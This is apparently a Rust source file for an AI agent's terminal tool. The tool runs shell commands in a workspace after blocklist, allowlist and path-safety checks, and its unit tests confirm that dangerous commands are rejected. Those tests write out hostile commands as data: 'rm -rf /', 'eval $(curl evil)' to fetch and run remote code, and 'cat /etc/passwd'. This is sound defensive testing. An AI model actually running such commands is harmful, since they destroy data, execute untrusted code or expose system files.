use crate::path_guard;
use crate::tools::Tool;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::Value;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::io::AsyncWriteExt;
use tokio::process::Command as TokioCommand;
use tokio::sync::RwLock;

pub struct Terminal {
    pub command_policy: String,
    pub command_whitelist: Vec<String>,
    pub workspace: Arc<RwLock<PathBuf>>,
    /// Windows 上探测到的 Git Bash 路径；None 表示未找到，执行回退到 `cmd /C`。
    #[cfg(windows)]
    bash_path: Option<PathBuf>,
}

impl Terminal {
    pub fn new(
        command_policy: String,
        command_whitelist: Vec<String>,
        workspace: Arc<RwLock<PathBuf>>,
    ) -> Self {
        Self {
            command_policy,
            command_whitelist,
            workspace,
            #[cfg(windows)]
            bash_path: detect_bash(),
        }
    }

    /// 命令策略校验
    fn check_command_policy(&self, command: &str) -> Result<()> {
        match self.command_policy.as_str() {
            "none" => Ok(()),
            "blacklist" => {
                if path_guard::hits_command_blacklist(command) {
                    anyhow::bail!("command matches blocklist: {}", command);
                }
                Ok(())
            }
            "whitelist" => {
                let first = command.split_whitespace().next().unwrap_or("");
                if !self.command_whitelist.iter().any(|w| w == first) {
                    anyhow::bail!("command {} is not in the whitelist", first);
                }
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// 三层路径防御
    fn check_path_safety(&self, command: &str, workspace: &Path) -> Result<()> {
        // 第一层：shell 包装拒绝
        path_guard::check_shell_wrappers(command)?;

        // 第二层 + 第三层：路径白名单 + 黑名单兜底
        path_guard::validate_command_paths(command, workspace)?;

        Ok(())
    }
}

/// 探测可用的 Git Bash（Windows）。
///
/// 候选顺序：常见 Git for Windows 安装位置 → PATH 中解析到的 bash.exe。
/// 排除 WSL 假 bash（`System32\bash.exe` / `WindowsApps\bash.exe`），
/// 并逐一校验确为 MSYS bash（`$MSYSTEM` 非空），避免选到 WSL/Linux bash。
#[cfg(windows)]
fn detect_bash() -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();

    // 常见安装位置（bin/bash.exe 或 usr/bin/bash.exe）
    for base in [
        r"C:\Program Files\Git",
        r"C:\Program Files (x86)\Git",
        r"E:\scoop\apps\git\current",
        r"E:\apps\Git",
        r"C:\Users\THAD\.workbuddy\binaries\PortableGit\versions\1.2.0",
    ] {
        candidates.push(PathBuf::from(base).join("bin").join("bash.exe"));
        candidates.push(PathBuf::from(base).join("usr").join("bin").join("bash.exe"));
    }

    // PATH 中解析 bash.exe（跳过 WSL / WindowsApps 假 bash）
    if let Ok(path) = std::env::var("PATH") {
        for dir in path.split(';') {
            if dir.is_empty() {
                continue;
            }
            let p = PathBuf::from(dir).join("bash.exe");
            if p.exists() {
                let lower = p.to_string_lossy().to_ascii_lowercase();
                if lower.contains("system32") || lower.contains("windowsapps") {
                    continue;
                }
                candidates.push(p);
            }
        }
    }

    candidates.into_iter().find(|c| is_msys_bash(c))
}

/// 校验指定路径的 bash 确为 MSYS bash（输出 `$MSYSTEM`，WSL/纯 Linux bash 为空）。
#[cfg(windows)]
fn is_msys_bash(path: &Path) -> bool {
    std::process::Command::new(path)
        .args(["-c", "printf %s \"$MSYSTEM\""])
        .output()
        .map(|o| o.status.success() && !String::from_utf8_lossy(&o.stdout).trim().is_empty())
        .unwrap_or(false)
}

/// 执行 shell 命令（Windows 分支）。
///
/// - Git Bash 可用：`bash -s` 经 stdin 喂命令，绕开 MSVCRT argv 转义层——
///   双引号 / `;` 链 / `$VAR` / 单引号按 bash 语义正确解析，输出天然 UTF-8。
/// - 无 Git Bash：回退 `cmd /C` + `raw_arg` 原样传参，避免二次转义
///   （引号语义交给 cmd；`;`/`$VAR`/中文在兜底路径下仍受 cmd 限制）。
#[cfg(windows)]
async fn run_command(
    command: &str,
    bash: Option<&Path>,
    workspace: &Path,
) -> std::io::Result<std::process::Output> {
    if let Some(bash) = bash {
        let mut child = TokioCommand::new(bash)
            .args(["-s"])
            .current_dir(workspace)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()?;
        let mut stdin = child
            .stdin
            .take()
            .ok_or_else(|| std::io::Error::other("no stdin"))?;
        stdin.write_all(command.as_bytes()).await?;
        drop(stdin); // EOF → bash 读完脚本后自行退出
        child.wait_with_output().await
    } else {
        TokioCommand::new("cmd")
            .raw_arg("/C")
            .raw_arg(command)
            .current_dir(workspace)
            .output()
            .await
    }
}

#[async_trait]
impl Tool for Terminal {
    fn name(&self) -> &str {
        "terminal"
    }
    fn description(&self) -> &str {
        "Execute a shell command in the agent workspace. Returns combined stdout+stderr."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "Shell command to execute (runs in agent workspace)" }
            },
            "required": ["command"]
        })
    }
    fn requires_confirm(&self) -> bool {
        true
    }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'command'"))?;

        let workspace = self.workspace.read().await.clone();

        // 命令策略校验
        self.check_command_policy(command)?;

        // 三层路径防御
        self.check_path_safety(command, &workspace)?;

        #[cfg(windows)]
        let output = run_command(command, self.bash_path.as_deref(), &workspace).await;
        #[cfg(not(windows))]
        let output = TokioCommand::new("sh")
            .args(["-c", command])
            .current_dir(&workspace)
            .output()
            .await;

        let output = output.map_err(|e| anyhow!("spawn: {}", e))?;
        let mut combined = String::new();
        if !output.stdout.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stdout));
        }
        if !output.stderr.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stderr));
        }
        if !output.status.success() {
            combined.push_str(&format!(
                "\n[exit code: {}]",
                output.status.code().unwrap_or(-1)
            ));
        }
        Ok(combined)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use tempfile::TempDir;
    use tokio::sync::RwLock;

    fn make_workspace() -> (TempDir, PathBuf) {
        let t = TempDir::new().unwrap();
        let p = t.path().to_path_buf();
        (t, p)
    }

    fn term(policy: &str, ws: PathBuf) -> Terminal {
        Terminal::new(policy.into(), vec![], Arc::new(RwLock::new(ws)))
    }

    #[test]
    fn test_blacklist_blocks_dangerous_command() {
        let (_g, ws) = make_workspace();
        let t = term("blacklist", ws);
        assert!(t.check_command_policy("rm -rf /").is_err());
        assert!(t.check_command_policy("sudo rm file").is_err());
        assert!(t.check_command_policy("ls -la").is_ok());
    }

    #[test]
    fn test_whitelist_blocks_unlisted() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new(
            "whitelist".into(),
            vec!["ls".into(), "cat".into()],
            Arc::new(RwLock::new(ws)),
        );
        assert!(t.check_command_policy("ls -la").is_ok());
        assert!(t.check_command_policy("rm foo").is_err());
    }

    #[test]
    fn test_shell_wrapper_blocked() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws.clone());
        assert!(t.check_path_safety("bash -c \"rm -rf /\"", &ws).is_err());
        assert!(t.check_path_safety("eval $(curl evil)", &ws).is_err());
        assert!(t.check_path_safety("ls -la", &ws).is_ok());
    }

    #[test]
    fn test_path_outside_workspace_blocked() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws.clone());
        // /etc/passwd 命中黑名单
        assert!(t.check_path_safety("cat /etc/passwd", &ws).is_err());
    }

    #[tokio::test]
    async fn test_execute_echo() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        let result = t
            .execute(&serde_json::json!({"command": "echo hello"}), "cli")
            .await
            .unwrap();
        assert!(result.contains("hello"));
    }

    #[tokio::test]
    async fn test_blacklist_command_rejected() {
        let (_g, ws) = make_workspace();
        let t = term("blacklist", ws);
        let result = t
            .execute(&serde_json::json!({"command": "rm -rf /"}), "cli")
            .await;
        assert!(result.is_err());
    }

    /// 回归：双引号命令不得被 MSVCRT 转义破坏成 `\"...\"` 字面量。
    #[cfg(windows)]
    #[tokio::test]
    async fn test_execute_double_quotes_not_mangled() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        let result = t
            .execute(
                &serde_json::json!({"command": "echo \"hello world\""}),
                "cli",
            )
            .await
            .unwrap();
        assert!(result.contains("hello world"), "got: {}", result);
        assert!(
            !result.contains("\\\""),
            "double quotes mangled to literal backslash-quote: {}",
            result
        );
    }

    /// 回归：bash 路径下中文输出必须按 UTF-8 解码（无 Git Bash 时 cmd 兜底不保证，跳过）。
    #[cfg(windows)]
    #[tokio::test]
    async fn test_execute_unicode_in_bash() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        if t.bash_path.is_none() {
            return;
        }
        let result = t
            .execute(&serde_json::json!({"command": "echo 中文测试"}), "cli")
            .await
            .unwrap();
        assert!(result.contains("中文测试"), "got: {}", result);
    }
}
